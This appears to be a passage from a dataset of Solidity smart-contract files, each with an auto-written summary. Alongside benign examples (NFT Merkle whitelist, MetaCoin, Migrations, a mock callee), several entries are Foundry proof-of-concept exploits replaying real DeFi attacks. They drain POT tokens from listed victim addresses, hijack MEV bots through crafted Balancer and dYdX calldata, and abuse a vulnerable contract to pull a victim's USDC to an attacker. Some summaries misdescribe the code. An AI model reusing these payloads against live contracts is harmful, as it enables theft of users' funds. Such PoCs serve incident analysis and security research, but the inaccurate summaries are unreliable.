        "code": "// SPDX-License-Identifier: MIT\n// By 0xAA\npragma solidity ^0.8.4;\n\nimport \"../34_ERC721/ERC721.sol\";\n\n\n/**\n * \u5229\u7528Merkle\u6811\u6811\u9a8c\u8bc1\u767d\u540d\u5355\uff08\u751f\u6210Merkle\u6811\u7684\u7f51\u9875\uff1ahttps://lab.miguelmota.com/merkletreejs/example/\uff09\n * \u9009\u4e0aKeccak-256, hashLeaves\u548csortPairs\u9009\u9879\n * 4\u4e2a\u53f6\u5b50\u5730\u5740\uff1a\n    [\n    \"0x5B38Da6a701c568545dCfcB03FcB875f56beddC4\", \n    \"0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2\",\n    \"0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db\",\n    \"0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB\"\n    ]\n * \u7b2c\u4e00\u4e2a\u5730\u5740\u5bf9\u5e94\u7684merkle proof\n    [\n    \"0x999bf57501565dbd2fdcea36efa2b9aef8340a8901e3459f4a4c926275d36cdb\",\n    \"0x4726e4102af77216b09ccd94f40daa10531c87c4d60bba7f3b3faf5ff9f19b3c\"\n    ]\n * Merkle root: 0xeeefd63003e0e702cb41cd0043015a6e26ddb38073cc6ffeb0ba3e808ba8c097\n */\n\n\n/**\n * @dev \u9a8c\u8bc1Merkle\u6811\u7684\u5408\u7ea6.\n *\n * proof\u53ef\u4ee5\u7528JavaScript\u5e93\u751f\u6210\uff1a\n * https://github.com/miguelmota/merkletreejs[merkletreejs].\n * \u6ce8\u610f: hash\u7528keccak256\uff0c\u5e76\u4e14\u5f00\u542fpair sorting \uff08\u6392\u5e8f\uff09.\n * javascript\u4f8b\u5b50\u89c1 `https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/test/utils/cryptography/MerkleProof.test.js`.\n */\nlibrary MerkleProof {\n    /**\n     * @dev \u5f53\u901a\u8fc7`proof`\u548c`leaf`\u91cd\u5efa\u51fa\u7684`root`\u4e0e\u7ed9\u5b9a\u7684`root`\u76f8\u7b49\u65f6\uff0c\u8fd4\u56de`true`\uff0c\u6570\u636e\u6709\u6548\u3002\n     * \u5728\u91cd\u5efa\u65f6\uff0c\u53f6\u5b50\u8282\u70b9\u5bf9\u548c\u5143\u7d20\u5bf9\u90fd\u662f\u6392\u5e8f\u8fc7\u7684\u3002\n     */\n    function verify(\n        bytes32[] memory proof,\n        bytes32 root,\n        bytes32 leaf\n    ) internal pure returns (bool) {\n        return processProof(proof, leaf) == root;\n    }\n\n    /**\n     * @dev Returns \u901a\u8fc7Merkle\u6811\u7528`leaf`\u548c`proof`\u8ba1\u7b97\u51fa`root`. \u5f53\u91cd\u5efa\u51fa\u7684`root`\u548c\u7ed9\u5b9a\u7684`root`\u76f8\u540c\u65f6\uff0c`proof`\u624d\u662f\u6709\u6548\u7684\u3002\n     * \u5728\u91cd\u5efa\u65f6\uff0c\u53f6\u5b50\u8282\u70b9\u5bf9\u548c\u5143\u7d20\u5bf9\u90fd\u662f\u6392\u5e8f\u8fc7\u7684\u3002\n     */\n    function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) {\n        bytes32 computedHash = leaf;\n        for (uint256 i = 0; i < proof.length; i++) {\n            computedHash = _hashPair(computedHash, proof[i]);\n        }\n        return computedHash;\n    }\n\n    // Sorted Pair Hash\n    function _hashPair(bytes32 a, bytes32 b) private pure returns (bytes32) {\n        return a < b ? keccak256(abi.encodePacked(a, b)) : keccak256(abi.encodePacked(b, a));\n    }\n}\n\ncontract MerkleTree is ERC721 {\n    bytes32 immutable public root; // Merkle\u4e66\u7684\u6839\n    mapping(address => bool) public mintedAddress;   // \u8bb0\u5f55\u5df2\u7ecfmint\u7684\u5730\u5740\n\n    // \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316NFT\u5408\u96c6\u7684\u540d\u79f0\u3001\u4ee3\u53f7\u3001Merkle\u6811\u7684\u6839\n    constructor(string memory name, string memory symbol, bytes32 merkleroot)\n    ERC721(name, symbol)\n    {\n        root = merkleroot;\n    }\n\n    // \u5229\u7528Merkle\u4e66\u9a8c\u8bc1\u5730\u5740\u5e76mint\n    function mint(address account, uint256 tokenId, bytes32[] calldata proof)\n    external\n    {\n        require(_verify(_leaf(account), proof), \"Invalid merkle proof\"); // Merkle\u68c0\u9a8c\u901a\u8fc7\n        require(!mintedAddress[account], \"Already minted!\"); // \u5730\u5740\u6ca1\u6709mint\u8fc7\n        \n        mintedAddress[account] = true; // \u8bb0\u5f55mint\u8fc7\u7684\u5730\u5740\n        _mint(account, tokenId); // mint\n    }\n\n    // \u8ba1\u7b97Merkle\u4e66\u53f6\u5b50\u7684\u54c8\u5e0c\u503c\n    function _leaf(address account)\n    internal pure returns (bytes32)\n    {\n        return keccak256(abi.encodePacked(account));\n    }\n\n    // Merkle\u6811\u9a8c\u8bc1\uff0c\u8c03\u7528MerkleProof\u5e93\u7684verify()\u51fd\u6570\n    function _verify(bytes32 leaf, bytes32[] memory proof)\n    internal view returns (bool)\n    {\n        return MerkleProof.verify(proof, root, leaf);\n    }\n}\n",
        "summary": "This Solidity smart contract implements a Merkle Tree verification process to grant permission for minting non-fungible tokens (NFTs). The contract uses a library called MerkleProof, which provides functions for verifying a Merkle proof and processing the proof to calculate a Merkle tree root. The contract also extends an ERC721 contract and adds a new function called `mint`, which takes an address, a token ID, and a Merkle proof. If the proof is valid, the contract mints an NFT to the given address. The constructor of the contract takes three arguments - the name of the NFT collection, the symbol of the NFT collection, and the Merkle root of the Merkle tree used for verification.",
        "id": "445d18bd-a2a5-488b-b09b-7e4abef50376"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\nimport \"./ConvertLib.sol\";\n\n// This is just a simple example of a coin-like contract.\n// It is not standards compatible and cannot be expected to talk to other\n// coin/token contracts. If you want to create a standards-compliant\n// token, see: https://github.com/ConsenSys/Tokens. Cheers!\n\ncontract MetaCoin {\n\tmapping (address => uint) balances;\n\n\tevent Transfer(address indexed _from, address indexed _to, uint256 _value);\n\n\tfunction MetaCoin() {\n\t\tbalances[tx.origin] = 10000;\n\t}\n\n\tfunction sendCoin(address receiver, uint amount) returns(bool sufficient) {\n\t\tif (balances[msg.sender] < amount) return false;\n\t\tbalances[msg.sender] -= amount;\n\t\tbalances[receiver] += amount;\n\t\tTransfer(msg.sender, receiver, amount);\n\t\treturn true;\n\t}\n\n\tfunction getBalanceInEth(address addr) returns(uint){\n\t\treturn ConvertLib.convert(getBalance(addr),2);\n\t}\n\n\tfunction getBalance(address addr) returns(uint) {\n\t\treturn balances[addr];\n\t}\n}\n",
        "summary": "This is a simple example of a coin-like contract called \"MetaCoin\" in Ethereum blockchain using Solidity programming language. It allows addresses to hold MetaCoins and transfer them to other addresses by calling \"sendCoin\" function. The balance of each address can be queried by calling \"getBalance\" function. Additionally, there is a \"getBalanceInEth\" function that converts the balance value in MetaCoins to its equivalent in Ether using a conversion library imported in the beginning of the contract. The contract also includes a constructor function that sets an initial balance of 10000 Metacoins to the address who created the contract (tx.origin). Finally, the contract emits an event named \"Transfer\" each time a transfer of MetaCoins happens.",
        "id": "e688e9dc-22ad-46f9-afb2-45d7ce8bf842"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\n@Analysis\nhttps://twitter.com/PeckShieldAlert/status/1645980197987192833\nhttps://twitter.com/Phalcon_xyz/status/1645963327502204929\n@TX (one of the txs)\ninvest\nhttps://bscscan.com/tx/0xdb01fa33bf5b79a3976ed149913ba0a18ddd444a072a2f34a0042bf32e4e7995\nwithdraw\nhttps://bscscan.com/tx/0x41853747231dcf01017cf419e6e4aa86757e59479964bafdce0921d3e616cc67\n*/\n\ninterface IApprove {\n    function approve() external;\n}\n\ncontract ContractTest is Test {\n\n    address pot = 0x3B5E381130673F794a5CF67FBbA48688386BEa86;\n    address usdt = 0x55d398326f99059fF775485246999027B3197955;\n    address pot_usdt_pool = 0x9117df9aA33B23c0A9C2C913aD0739273c3930b3;\n    address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n\n    function setUp() public {\n        vm.createSelectFork(\"bsc\", 27264384 - 1);\n    }\n\n    function testExploit() public {\n        address[11] memory victims = [\n            0x724DbEA8A0ec7070de448ef4AF3b95210BDC8DF6,\n            0xE5cBd18Db5C1930c0A07696eC908f20626a55E3C,\n            0xC254741776A13f0C3eFF755a740A4B2aAe14a136,\n            0x5923375f1a732FD919D320800eAeCC25910bEdA3,\n            0x68531F3d3A20027ed3A428e90Ddf8e32a9F35DC8,\n            0x807d99bfF0bad97e839df3529466BFF09c09E706,\n            0xA56622BB16F18AF5B6D6e484a1C716893D0b36DF,\n            0x8acb88F90D1f1D67c03379e54d24045D4F6dfDdB,\n            0xe8d6502E9601D1a5fAa3855de4a25b5b92690623,\n            0x435444d086649B846E9C912D21E1Bc651033A623,\n            0x52AeD741B5007B4fb66860b5B31dD4c542D65785\n        ];\n        // approve\n        for (uint256 i = 0; i < victims.length; i++) {\n            IApprove(victims[i]).approve();\n        }\n        // transfer\n        for (uint256 i = 0; i < victims.length; i++) {\n            uint256 amount = IERC20(pot).balanceOf(victims[i]);\n            if (amount == 0) {\n                continue;\n            }\n            IERC20(pot).transferFrom(victims[i], address(this), amount);\n        }\n        bscSwap(pot, usdt, IERC20(pot).balanceOf(address(this)));\n        bscSwap(usdt, wbnb, IERC20(usdt).balanceOf(address(this)));\n\n        uint256 wbnbBalance = IERC20(wbnb).balanceOf(address(this));\n        emit log_named_decimal_uint(\"[After Attacks]  Attacker WBNB balance\", wbnbBalance, 18);\n    }\n\n    function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {\n        IERC20(tokenFrom).approve(address(Router), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = tokenFrom;\n        path[1] = tokenTo;\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);\n    }\n}",
        "summary": "This is a Solidity smart contract that tests an exploit on the Binance Smart Chain. It imports two other smart contracts and defines a few variables, including addresses for various tokens and a Uniswap router contract. There is a setup function and a test function, which is where the exploit is carried out. Within the test function, it interacts with a list of victims and uses approve and transferFrom functions to obtain tokens. It then performs token swaps and logs the balance of a particular token for the attacker's address after the attack is carried out.",
        "id": "eadd75de-4290-49e8-9939-28d938ea6ded"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface SushiRouter {\n    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;\n}\n\ncontract ContractTest is DSTest {\n    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    address attacker = 0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01;\n    address sushiSwapRouter = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n    cheats.createSelectFork(\"moonriver\", 1442490); //fork moonriver at block 1442490\n    // https://moonriver.moonscan.io/tx/0x5a87c24d0665c8f67958099d1ad22e39a03aa08d47d00b7276b8d42294ee0591\n    }\n\n    function testExploit() public {\n        cheats.startPrank(attacker); \n\n        address[] memory path = new address[](2);\n        path[0] = 0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01;\n        path[1] = 0x639A647fbe20b6c8ac19E48E2de44ea792c62c5C;\n        // sushiSwapRouter.call(hex\"38ed173900000000000000000000000000000000000000000000006c6b935b8bbd400000000000000000000000000000000000000000000000000000d30870ab532ed0c500000000000000000000000000000000000000000000000000000000000000a00000000000000000000000008d3d13cac607b7297ff61a5e1e71072758af4d010000000000000000000000000000000000000000000000000000000061fe94f80000000000000000000000000000000000000000000000000000000000000002000000000000000000000000868892cccedbff0b028f3b3595205ea91b99376b000000000000000000000000639a647fbe20b6c8ac19e48e2de44ea792c62c5c\");\n\n        sushiSwapRouter.call(abi.encodeWithSignature(\"swapExactTokensForTokens(uint256,uint256,address[],address,uint256)\", \n        2000000000000000000000, // amountIn\n        15206528022953775301, // amountOutMin\n        path, // path\n        0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01, // to\n        1644074232 // deadline\n        ));\n    }\n}\n",
        "summary": "This code is a smart contract that includes a test function called `testExploit` that exploits a vulnerability in the SushiSwap router. The function swaps a specific amount of tokens from one address to another using `SushiRouter.swapExactTokensForTokens()` function of the SushiSwap router. The `setUp()` function is used to initialize the fork of a blockchain at a specific block number in order to test the exploit. The contract imports an interface, `interface.sol`, that defines the `SushiRouter` interface and also imports the `Test.sol` library for testing. `CheatCodes` is a custom contract deployed at the address `0x7109709ECfa91a80626fF3989D68f67F5b1DD12D`.",
        "id": "a8e1748e-d746-4df9-9e6d-a842b9332cf6"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n//  @Analysis\n// https://twitter.com/BlockSecTeam/status/1580779311862190080\n// https://twitter.com/AnciliaInc/status/1580705036400611328\n\ncontract ContractTest is DSTest{\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n    address constant MEVBOT = 0x00000000000A47b1298f18Cf67de547bbE0D723F;\n    address constant exploiter = 0x4b77c789fa35B54dAcB5F6Bb2dAAa01554299d6C;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15741332);\n    }\n\n    function testExploit() public{\n        address [] memory tokens = new address[](1);\n        tokens[0] = address(WETH);\n        uint256 [] memory amounts = new uint256[](1);\n        amounts[0] = 1;\n        // no idea of what of how this byte calldata works\n        bytes memory userData = bytes.concat(\n            abi.encode(\n            0x0000000000000000000000000000000000000000000000000000000000000080,\n            0x0000000000000000000000000000000000000000000000000000000000000100,\n            0x0000000000000000000000000000000000000000000000000000000000000280,\n            0x00000000000000000000000000000000000000000000000a2d7f7bb876b5a551,\n            0x0000000000000000000000000000000000000000000000000000000000000003,\n            address(WETH),\n            address(USDC),\n            address(WETH),\n            0x0000000000000000000000000000000000000000000000000000000000000002,\n            0x0000000000000000000000000000000000000000000000000000000000000040,\n            0x00000000000000000000000000000000000000000000000000000000000000c0\n            ),\n            abi.encode(\n            0x0000000000000000000000000000000000000000000000000000000000000060,\n            0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2a0b86991c6218b36c1d19d4a,\n            0x2e9eb0ce3606eb48000000000000000000000000000000000000000000000000,\n            0x0000000a707868e3b4dea47088e6a0c2ddd26feeb64f039a2c41296fcb3f5640,\n            0x0000000000000000000000000000000000000000000000000000000000000064,\n            0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48c02aaa39b223fe8d0a0e5c4f,\n            0x27ead9083c756cc2000000000000000000000000000000000000000000000000,\n            0x000000000000003d539801af4b77c789fa35b54dacb5f6bb2daaa01554299d6c,\n            // 3d539801af + address(exploiter)\n            0x26f2000000000000000000000000000000000000000000000000000000000000,\n            0x0000000000000000000000000000000000000000000000000000000000000002,\n            0x0000000000000000000000000000000000000000000000000000000000000008,\n            0x0000000000000000000000000000000000000000000000000000000000000000\n            )\n        );      \n        balancer.flashLoan(MEVBOT, tokens, amounts, userData);\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDC balance after exploit\",\n            USDC.balanceOf(exploiter),\n            6\n        );\n    }\n}",
        "summary": "This is a Solidity smart contract that tries to exploit a vulnerability in a Balancer smart contract. It imports some interface contracts and defines some constants and variables. The function testExploit contains some operation data and passes it to the BalancerVault.flashLoan function, which is the function that contains the vulnerability. The objective of the exploit is to manipulate the liquidity pool in order to obtain an arbitrary amount of tokens. For this, the exploit uses flash loans to borrow tokens from the pool, manipulates the pool's balances to generate arbitrage opportunities and then repays the flash loan with the acquired tokens.",
        "id": "3144001b-5058-4613-ae2b-794685196fa4"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/**\n * POC Build by\n * - https://twitter.com/kayaba2002\n * - https://twitter.com/eugenioclrc\n */\n\ninterface Structs {\n    struct Val {\n        uint256 value;\n    }\n\n    enum ActionType {\n        Deposit, // supply tokens\n        Withdraw, // borrow tokens\n        Transfer, // transfer balance between accounts\n        Buy, // buy an amount of some token (externally)\n        Sell, // sell an amount of some token (externally)\n        Trade, // trade tokens against another account\n        Liquidate, // liquidate an undercollateralized or expiring account\n        Vaporize, // use excess tokens to zero-out a completely negative account\n        Call // send arbitrary data to an address\n    }\n\n    enum AssetDenomination {\n        Wei // the amount is denominated in wei\n    }\n\n    enum AssetReference {\n        Delta // the amount is given as a delta from the current value\n    }\n\n    struct AssetAmount {\n        bool sign; // true if positive\n        AssetDenomination denomination;\n        AssetReference ref;\n        uint256 value;\n    }\n\n    struct ActionArgs {\n        ActionType actionType;\n        uint256 accountId;\n        AssetAmount amount;\n        uint256 primaryMarketId;\n        uint256 secondaryMarketId;\n        address otherAddress;\n        uint256 otherAccountId;\n        bytes data;\n    }\n\n    struct Info {\n        address owner; // The address that owns the account\n        uint256 number; // A nonce that allows a single address to control many accounts\n    }\n\n    struct Wei {\n        bool sign; // true if positive\n        uint256 value;\n    }\n}\n\nlibrary Account {\n    struct Info {\n        address owner;\n        uint256 number;\n    }\n}\n\ninterface DyDxPool is Structs {\n    function getAccountWei(Info memory account, uint256 marketId) external view returns (Wei memory);\n    function operate(Info[] memory, ActionArgs[] memory) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    DyDxPool pool = DyDxPool(0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e); //this is dydx solo margin sc\n\n    address exploiter;\n    address MEVBOT = 0xbaDc0dEfAfCF6d4239BDF0b66da4D7Bd36fCF05A;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        exploiter = cheats.addr(31337);\n\n        // fork mainnet at block 15625424\n        cheats.createSelectFork(\"mainnet\", 15625424);\n    }\n\n    function testExploit() public {\n        emit log_named_decimal_uint(\"MEV Bot balance before exploit:\", weth.balanceOf(MEVBOT), 18);\n\n        Structs.Info[] memory _infos = new Structs.Info[](1);\n        _infos[0] = Structs.Info({owner: address(this), number: 1});\n\n        Structs.ActionArgs[] memory _args = new Structs.ActionArgs[](1);\n        _args[0] = Structs.ActionArgs(\n            // ActionType actionType;\n            Structs.ActionType.Call,\n            // uint256 accountId;\n            0,\n            // AssetAmount amount;\n            Structs.AssetAmount(\n                // bool sign; // true if positive\n                false,\n                // AssetDenomination denomination;\n                Structs.AssetDenomination.Wei,\n                // AssetReference ref;\n                Structs.AssetReference.Delta,\n                // uint256 value;\n                0\n            ),\n            // uint256 primaryMarketId;\n            0,\n            // uint256 secondaryMarketId;\n            0,\n            // address otherAddress;\n            MEVBOT,\n            // uint256 otherAccountId;\n            0,\n            // bytes data;\n            //abi.encodeWithSignature(\"approve(address,uint256)\", address(this), type(uint256).max)\n            // no idea of what of how this byte calldata works\n            bytes.concat(\n                abi.encode(\n                    0x0000000000000000000000000000000000000000000000000000000000000003,\n                    address(pool),\n                    0x0000000000000000000000000000000000000000000000000000000000000000,\n                    0x0000000000000000000000000000000000000000000000000000000000000000,\n                    0x0000000000000000000000000000000000000000000000000000000000000000,\n                    0x00000000000000000000000000000000000000000000000000000000000000e0,\n                    0x000000000000000000000000000000000000000000000beff1ceef246ef7bd1f,\n                    0x0000000000000000000000000000000000000000000000000000000000000001,\n                    0x0000000000000000000000000000000000000000000000000000000000000020,\n                    0x0000000000000000000000000000000000000000000000000000000000000000,\n                    0x0000000000000000000000000000000000000000000000000000000000000000,\n                    address(this),\n                    address(weth)\n                ),\n                abi.encode(\n                    0x00000000000000000000000000000000000000000000000000000000000000a0,\n                    address(this),\n                    0x0000000000000000000000000000000000000000000000000000000000000040,\n                    0x00000000000000000000000000000000000000000000000000000000000000a0,\n                    0x0000000000000000000000000000000000000000000000000000000000000004,\n                    0x4798ce5b00000000000000000000000000000000000000000000000000000000,\n                    0x0000000000000000000000000000000000000000000000000000000000000002,\n                    0x0000000000000000000000000000000000000000000000000000000000000004,\n                    0x0000000000000000000000000000000000000000000000000000000000000001,\n                    0x0000000000000000000000000000000000000000000000000000000000000001,\n                    0x0000000000000000000000000000000000000000000000000000000000000002,\n                    0x0000000000000000000000000000000000000000000000000000000000000002\n                )\n            )\n        );\n\n        pool.operate(_infos, _args);\n\n        emit log_named_decimal_uint(\"Contract BADCODE WETH Allowance\", weth.allowance(MEVBOT, address(this)), 18);\n\n        weth.transferFrom(MEVBOT, exploiter, weth.balanceOf(MEVBOT));\n\n        emit log_named_decimal_uint(\"MEV Bot WETH balance After exploit:\", weth.balanceOf(MEVBOT), 18);\n\n        emit log_named_decimal_uint(\"Exploiter WETH balance After exploit:\", weth.balanceOf(exploiter), 18);\n\n        assertEq(weth.balanceOf(MEVBOT), 0);\n    }\n\n    /**\n     * For some reason it calls a 00000000 function on our contract.\n     * By changing values on the encode args we can proabaly change the func signature\n     * Meanwhile we can add a fallback and run our logic in there.\n     *\n     * ContractTest::00000000(000000000000000000000000000000000000000000000000000000044798ce5b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000beff1ceef246ef7bd1f00000000000000000000000000000000000000000000000000000001)\n     */\n    fallback() external {}\n}\n",
        "summary": "This code is a Solidity smart contract that aims to perform an exploit on a third-party smart contract, specifically the DyDx Solo Margin contract. The attack involves using a \"MEV Bot\" to interact with DyDx's smart contracts, with the ultimate goal of stealing ether (WETH) from the contract. The contract logic itself involves calling arbitrary data to interact with the target contract and transferring WETH from the MEV Bot to the attacker's address. The contract also contains test functions and a fallback function in case the attack fails or there is some unexpected behavior.",
        "id": "58c1d3c9-401c-4afd-89d7-bd8c8962f429"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\n\n// Attacker: 0xae39a6c2379bef53334ea968f4c711c8cf3898b6\n// Vulnerable Contract: 0x0ad8229d4bc84135786ae752b9a9d53392a8afd4\n// Attack Tx: https://phalcon.blocksec.com/tx/eth/0x674f74b30a3d7bdf15fa60a7c29d96a402ea894a055f624164a8009df98386a0\n//            https://etherscan.io/tx/0x674f74b30a3d7bdf15fa60a7c29d96a402ea894a055f624164a8009df98386a0\n\n// @Analysis\n// https://twitter.com/Supremacy_CA/status/1590337718755954690\n\ncontract Exploit is Test {\n    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n\n    address private constant vulnerableContract = 0x0AD8229D4bC84135786AE752B9A9D53392A8afd4;\n    address private constant attacker = 0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6;\n    address private constant victim = 0x211B6a1137BF539B2750e02b9E525CF5757A35aE;\n\n    function testHack() external {\n        vm.createSelectFork(\"https://rpc.builder0x69.io\", 15926096);\n\n        // use these tools to decode raw calldata: https://www.ethcmd.com/tools/decode-calldata/  +  https://calldata-decoder.apoorv.xyz/\n        bytes memory payload = abi.encodeWithSelector(\n            0x090f88ca,\n            address(USDC),\n            address(WETH),\n            0,  // ?\n            1,  // ?\n            abi.encodeWithSelector( \n                IERC20.transferFrom.selector,\n                victim,\n                attacker,\n                USDC.balanceOf(victim)\n            )\n        );\n\n        vulnerableContract.call(payload);\n\n        console.log(\"Attacker's profit: %s USDC\", USDC.balanceOf(attacker) / 1e6);\n    }\n}\n\n/* -------------------- Interface -------------------- */\ninterface IERC20 {\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    function deliver(uint256 tAmount) external;\n}\n\ninterface WETH9 {\n    function deposit() external payable;\n    function transfer(address to, uint256 value) external returns (bool);\n    function approve(address guy, uint256 wad) external returns (bool);\n    function withdraw(uint256 wad) external;\n    function balanceOf(address) external view returns (uint256);\n}",
        "summary": "This Solidity contract is an attack script that exploits a vulnerability in the vulnerableContract smart contract. The attack involves manipulating the transaction payload of the vulnerable smart contract to transfer the victim's USDC tokens to the attacker's address using the `IERC20.transferFrom` function. The attacker defines the victim and attacker addresses and exploits the `vulnerableContract`, then logs the balance of USDC tokens transferred to the attacker's address.",
        "id": "9e4c2c80-460b-4ce8-bcba-3c3f7803b97f"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract Migrations {\n  address public owner;\n  uint public last_completed_migration;\n\n  modifier restricted() {\n    if (msg.sender == owner) _;\n  }\n\n  function Migrations() {\n    owner = msg.sender;\n  }\n\n  function setCompleted(uint completed) restricted {\n    last_completed_migration = completed;\n  }\n\n  function upgrade(address new_address) restricted {\n    Migrations upgraded = Migrations(new_address);\n    upgraded.setCompleted(last_completed_migration);\n  }\n}\n",
        "summary": "This is a smart contract in Solidity programming language. It defines a contract called Migrations with three functions - setCompleted, upgrade, and a constructor with the same name as the contract. It also has a modifier called restricted which restricts the access of these functions to the owner of the contract. \n\nThe variables in the contract are owner and last_completed_migration, both of which are public. \n\nThe setCompleted function sets the variable last_completed_migration to the value of the parameter passed to it. The upgrade function upgrades the contract to a new address by creating a new instance of the Migrations contract and calling its setCompleted function. \n\nThe constructor function sets the variable owner to the address of the caller of the function.",
        "id": "fdc03be7-f989-4993-b473-bb14a58a1ac4"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\n/**\n * @dev Error that occurs when a method reverts.\n * @param emitter The contract that emits the error.\n */\nerror Reverted(address emitter);\n\n/**\n * @title MockCallee\n * @author pcaversaccio\n * @notice Forked and adjusted accordingly from here:\n * https://github.com/mds1/multicall/blob/master/src/test/mocks/MockCallee.sol.\n * @dev Receives calls from the multicaller.\n */\ncontract MockCallee {\n    uint256 public number;\n    address private self = address(this);\n\n    /**\n     * @dev Stores a uint256 value in the variable `number`.\n     * @param num The uint256 value to store.\n     * @return bool A Boolean variable indicating success or failure.\n     */\n    function store(uint256 num) public returns (bool) {\n        number = num;\n        return true;\n    }\n\n    /**\n     * @dev Returns the block hash for the given block number.\n     * @param blockNumber The block number.\n     * @return blockHash The 32-byte block hash.\n     */\n    function getBlockHash(\n        uint256 blockNumber\n    ) public view returns (bytes32 blockHash) {\n        blockHash = blockhash(blockNumber);\n    }\n\n    /**\n     * @dev A function that simply reverts.\n     */\n    function thisMethodReverts() public view {\n        revert Reverted(self);\n    }\n\n    /**\n     * @dev A transfer function that accepts a `msg.value`.\n     * @param target The destination address of the ether transfer.\n     */\n    function transferEther(address target) public payable {\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool ok, ) = target.call{value: msg.value}(\"\");\n        if (!ok) revert Reverted(self);\n    }\n}\n",
        "summary": "This is a Solidity smart contract named \"MockCallee\" with three functions. The first \"store\" function stores a uint256 value in a public variable named \"number.\" The second \"getBlockHash\" function retrieves and returns a block hash for a given block number. The third function named \"thisMethodReverts\" simply reverts, meaning it throws an error, and emits a custom error event named \"Reverted\" from the contract with the address of the contract. The final function named \"transferEther\" allows for the transfer of Ether to a specified address and will throw an error if this transfer fails.",
        "id": "d922550b-a66b-410d-a516-8c587b5e41cd"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract Base1 {\n    modifier exactDividedBy2And3(uint _a) virtual {\n        require(_a % 2 == 0 && _a % 3 == 0);\n        _;\n    }\n}\n\ncontract Identifier is Base1 {\n\n    //\u8ba1\u7b97\u4e00\u4e2a\u6570\u5206\u522b\u88ab2\u9664\u548c\u88ab3\u9664\u7684\u503c\uff0c\u4f46\u662f\u4f20\u5165\u7684\u53c2\u6570\u5fc5\u987b\u662f2\u548c3\u7684\u500d\u6570\n    function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) {\n        return getExactDividedBy2And3WithoutModifier(_dividend);\n    }\n\n    //\u8ba1\u7b97\u4e00\u4e2a\u6570\u5206\u522b\u88ab2\u9664\u548c\u88ab3\u9664\u7684\u503c\n    function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint){\n        uint div2 = _dividend / 2;\n        uint div3 = _dividend / 3;\n        return (div2, div3);\n    }\n\n    //\u91cd\u5199Modifier: \u4e0d\u91cd\u5199\u65f6\uff0c\u8f93\u51659\u8c03\u7528getExactDividedBy2And3\uff0c\u4f1arevert\uff0c\u56e0\u4e3a\u65e0\u6cd5\u901a\u8fc7\u68c0\u67e5\n    //\u5220\u6389\u4e0b\u9762\u4e09\u884c\u6ce8\u91ca\u91cd\u5199Modifier\uff0c\u8fd9\u65f6\u5019\u8f93\u51659\u8c03\u7528getExactDividedBy2And3\uff0c \u4f1a\u8c03\u7528\u6210\u529f\n    // modifier 